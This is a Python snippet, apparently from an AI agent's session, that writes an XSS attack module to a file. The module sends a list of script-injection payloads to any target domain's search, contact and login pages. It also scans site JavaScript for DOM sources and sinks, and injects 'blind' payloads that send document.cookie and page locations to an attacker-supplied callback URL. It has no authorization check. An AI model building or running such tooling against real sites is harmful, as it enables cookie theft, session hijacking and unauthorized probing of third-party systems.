xss_code = r'''#!/usr/bin/env python3
import requests
import re
from urllib.parse import urljoin

XSS_PAYLOADS = [
    r"<script>alert(1)</script>",
    r"<script>alert(document.domain)</script>",
    r"<script>confirm(1)</script>",
    r"<script>prompt(1)</script>",
    r'\"><script>alert(1)</script>',
    r"'><script>alert(1)</script>",
    r"</script><script>alert(1)</script>",
    r"</title><script>alert(1)</script>",
    r"<img src=x onerror=alert(1)>",
    r"<img src=invalid onerror=confirm(1)>",
    r"<img src=x onerror=prompt(1)>",
    r"<svg onload=alert(1)>",
    r"<svg/onload=alert(1)>",
    r"<svg><script>alert(1)</script></svg>",
    r"<body onload=alert(1)>",
    r"<body onmouseover=alert(1)>",
    r"<div onmouseover=alert(1)>X</div>",
    r"<input onfocus=alert(1) autofocus>",
    r"javascript:alert(1)",
    r"javascript:confirm(1)",
    r"javascript:prompt(1)",
    r'" onmouseover=alert(1) x="',
    r"' onmouseover=alert(1) x='",
    r'" autofocus onfocus=alert(1) x="',
    r"%3Cscript%3Ealert(1)%3C/script%3E",
    r"%3Cimg%20src=x%20onerror=alert(1)%3E",
    r"&lt;script&gt;alert(1)&lt;/script&gt;",
    r"'\"><svg/onload=alert(1)>",
    r'\"><img/src=x/onerror=alert(1)>',
    r'\"><iframe src=javascript:alert(1)>',
    r"${alert(1)}",
    r"{{alert(1)}}",
    r"<%= alert(1) %>",
    r"<script>document.body.innerHTML='XSS'</script>",
    r"<script>eval('alert(1)')</script>"
]

USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
HEADERS = {"User-Agent": USER_AGENT}
TIMEOUT = 10


def check_context(html, payload):
    idx = html.find(payload)
    if idx == -1:
        return "none"
    window = html[max(0, idx-40):idx+len(payload)+40]
    if f"<script>{payload}" in window or f"<script>{payload}</script>" in window:
        return "script"
    if "=" in window and (window.count('"') % 2 == 1 or window.count("'") % 2 == 1):
        return "attr"
    return "html"


def probe_xss(domain, session=None, rate_limiter=None, pages=None, log_callback=None):
    if session is None:
        session = requests.Session()
        session.headers.update(HEADERS)
    
    if pages is None:
        pages = [
            f"http://{domain}",
            f"https://{domain}",
            f"http://{domain}/search",
            f"http://{domain}/contact",
            f"http://{domain}/login"
        ]
    
    hits = []
    
    for page in pages:
        try:
            if rate_limiter:
                rate_limiter.sleep()
            
            r = session.get(page, timeout=5, headers=HEADERS)
            
            if "<form" not in r.text.lower() and "input" not in r.text.lower():
                continue
            
            for payload in XSS_PAYLOADS:
                try:
                    if rate_limiter:
                        rate_limiter.sleep()
                    
                    test_url = f"{page}?q={payload}&search={payload}&id={payload}"
                    r2 = session.get(test_url, timeout=5, headers=HEADERS)
                    
                    if payload in r2.text:
                        ctx = check_context(r2.text, payload)
                        finding = {
                            "url": test_url,
                            "payload": payload,
                            "context": ctx,
                            "status_code": r2.status_code
                        }
                        hits.append(finding)
                        
                        if log_callback:
                            log_callback(f"XSS REFLECTED [{ctx}]: {test_url}", "WARN")
                
                except Exception:
                    pass
        
        except Exception:
            pass
    
    return hits


def probe_dom_xss(domain, session=None, rate_limiter=None, log_callback=None):
    if session is None:
        session = requests.Session()
        session.headers.update(HEADERS)
    
    dom_sources = [
        "location.hash",
        "location.href",
        "location.search",
        "document.URL",
        "document.documentURI",
        "document.baseURI",
        "document.cookie",
        "document.referrer",
        "window.name",
        "history.pushState",
        "history.replaceState",
        "localStorage",
        "sessionStorage",
        "postMessage"
    ]
    
    dom_sinks = [
        "eval(",
        "Function(",
        "setTimeout(",
        "setInterval(",
        "document.write(",
        "document.writeln(",
        "innerHTML",
        "outerHTML",
        "insertAdjacentHTML",
        "onevent",
        "location.href",
        "location.replace(",
        "location.assign(",
        "window.open(",
        "document.cookie"
    ]
    
    findings = []
    
    try:
        if rate_limiter:
            rate_limiter.sleep()
        
        r = session.get(f"http://{domain}", timeout=10, headers=HEADERS)
        js_files = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', r.text, re.IGNORECASE)
        
        for js_url in js_files[:10]:
            try:
                if rate_limiter:
                    rate_limiter.sleep()
                
                if js_url.startswith("http"):
                    full_url = js_url
                else:
                    full_url = f"http://{domain}{js_url}"
                
                js_r = session.get(full_url, timeout=10, headers=HEADERS)
                js_content = js_r.text
                
                found_sources = [s for s in dom_sources if s in js_content]
                found_sinks = [s for s in dom_sinks if s in js_content]
                
                if found_sources and found_sinks:
                    finding = {
                        "file": full_url,
                        "sources": found_sources,
                        "sinks": found_sinks
                    }
                    findings.append(finding)
                    
                    if log_callback:
                        log_callback(f"DOM XSS potential in {full_url}", "WARN")
            
            except Exception:
                pass
    
    except Exception:
        pass
    
    return findings


def probe_blind_xss(domain, callback_url, session=None, rate_limiter=None, log_callback=None):
    if session is None:
        session = requests.Session()
        session.headers.update(HEADERS)
    
    blind_payloads = [
        f"<script src='{callback_url}'></script>",
        f"<img src=x onerror=fetch('{callback_url}?c='+document.cookie)>",
        f"<svg onload=fetch('{callback_url}?l='+location.href)>",
        f"<script>fetch('{callback_url}?d='+document.domain)</script>"
    ]
    
    results = []
    
    for payload in blind_payloads:
        try:
            if rate_limiter:
                rate_limiter.sleep()
            
            test_url = f"http://{domain}/?q={payload}"
            r = session.get(test_url, timeout=5, headers=HEADERS)
            
            results.append({
                "payload": payload,
                "url": test_url,
                "status": r.status_code
            })
        
        except Exception:
            pass
    
    return results


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="XSS Testing Module")
    parser.add_argument("-t", "--target", required=True, help="Target domain")
    parser.add_argument("--blind-callback", help="Callback URL for blind XSS")
    parser.add_argument("--dom", action="store_true", help="Enable DOM XSS detection")
    args = parser.parse_args()
    
    print(f"[*] XSS Probe: {args.target}")
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    reflected = probe_xss(args.target, session=session)
    print(f"[+] Reflected XSS findings: {len(reflected)}")
    
    for hit in reflected:
        print(f"  [{hit['context']}] {hit['url'][:80]}...")
    
    if args.dom:
        dom = probe_dom_xss(args.target, session=session)
        print(f"[+] DOM XSS potentials: {len(dom)}")
        for d in dom:
            print(f"  File: {d['file']}")
            print(f"    Sources: {', '.join(d['sources'][:3])}")
            print(f"    Sinks: {', '.join(d['sinks'][:3])}")
    
    if args.blind_callback:
        blind = probe_blind_xss(args.target, args.blind_callback, session=session)
        print(f"[+] Blind XSS payloads injected: {len(blind)}")
'''

with open('/mnt/agents/output/xss_module.py', 'w', encoding='utf-8') as f:
    f.write(xss_code)

print("xss_module.py")
